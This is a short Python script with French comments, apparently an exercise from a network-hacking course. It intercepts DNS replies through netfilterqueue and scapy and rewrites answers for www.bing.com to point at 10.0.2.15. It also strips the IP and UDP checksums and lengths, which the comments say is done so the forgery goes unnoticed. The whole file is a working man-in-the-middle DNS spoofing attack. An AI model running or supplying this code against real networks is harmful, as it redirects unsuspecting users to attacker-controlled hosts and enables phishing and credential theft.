#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

#fonction qui va permettre de chercher des informations sur le DNS des packets recus
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    #verifie si la couche DNSRR existe dans le packet
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        #si la requete a ete effectuer vers ce site
        if "www.bing.com" in qname:
            print("[+] Spoofing target")

            #la reponse sera modifier par un autre site web
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            #checksum et la longueur, afin qu'il ne detecte pas que la reponse a été modifié
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

#creation d'une queue afin de pouvoir traité les packets et de les modifier
queue = netfilterqueue.NetfilterQueue()
try:
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Quitting program")

